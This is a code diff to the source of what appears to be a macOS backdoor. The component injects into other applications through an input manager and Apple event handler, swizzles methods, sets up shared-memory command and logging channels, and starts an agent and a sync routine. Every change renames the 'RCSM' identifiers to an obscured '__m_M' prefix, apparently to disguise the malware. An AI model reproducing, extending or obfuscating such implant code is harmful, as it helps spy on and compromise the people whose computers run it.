@@ -40,8 +40,8 @@
 //
 // We can't allocate instance variable in factory methods
 //
-RCSMSharedMemory *mSharedMemoryCommand;
-RCSMSharedMemory *mSharedMemoryLogging;
+__m_MSharedMemory *mSharedMemoryCommand;
+__m_MSharedMemory *mSharedMemoryLogging;
 int32_t gBackdoorPID = 0;
 
 BOOL isAppRunning = YES;
@@ -160,7 +160,7 @@ OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
   gBackdoorPID = value;
   
 #ifdef DEBUG_INPUT_MANAGER
-  verboseLog(@"%s: running RCSeload event handler", __FUNCTION__);
+  verboseLog(@"%s: running __m_eload event handler", __FUNCTION__);
 #endif
     
   return resultCode;
@@ -297,7 +297,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
 @end
 
-@implementation RCSMInputManager
+@implementation __m_MInputManager
 
 + (void)getSystemVersionMajor: (u_int *)major
                         minor: (u_int *)minor
@@ -352,15 +352,15 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 + (void)load
 {
 #ifdef ENABLE_LOGGING
-  [RCSMLogger setComponent: @"im"];
-  [RCSMLogger enableProcessNameVisualization: YES];
+  [__m_MLogger setComponent: @"im"];
+  [__m_MLogger enableProcessNameVisualization: YES];
 #endif
   
   // First thing we need to initialize the shared memory segments
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
   // Init OS numbers
-  [RCSMInputManager getSystemVersionMajor: &gOSMajor
+  [__m_MInputManager getSystemVersionMajor: &gOSMajor
                                     minor: &gOSMinor
                                    bugFix: &gOSBugFix];
   
@@ -452,7 +452,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
 
-  mSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+  mSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                           size: gMemCommandMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
   if ([mSharedMemoryCommand createMemoryRegion] == -1)
@@ -464,7 +464,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       return NO;
     }
 
-  mSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+  mSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                           size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
 
@@ -527,7 +527,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 
                     // Ok, now sync bitch!
                     /*
-                    RCSMCommunicationManager *commManager = [[RCSMCommunicationManager alloc]
+                    __m_MCommunicationManager *commManager = [[__m_MCommunicationManager alloc]
                                                              initWithConfiguration: syncConfig];
                     
                     if ([commManager performSync] == FALSE)
@@ -807,7 +807,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #ifdef DEBUG_INPUT_MANAGER
   NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
   
-  infoLog(@"RCSMInputManager loaded by %@ at path %@", bundleIdentifier,
+  infoLog(@"__m_MInputManager loaded by %@ at path %@", bundleIdentifier,
         [[NSBundle mainBundle] bundlePath]);
 #endif
   [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
@@ -1188,7 +1188,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       if (appFlag == 1)
         {
           appFlag = 2;
-          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+          __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
 
           [appAgent start];
 
@@ -1199,7 +1199,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       else if (appFlag == 3)
         {
           appFlag = 0;
-          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+          __m_MAgentApplication *appAgent = [__m_MAgentApplication sharedInstance];
 
           [appAgent stop];
 
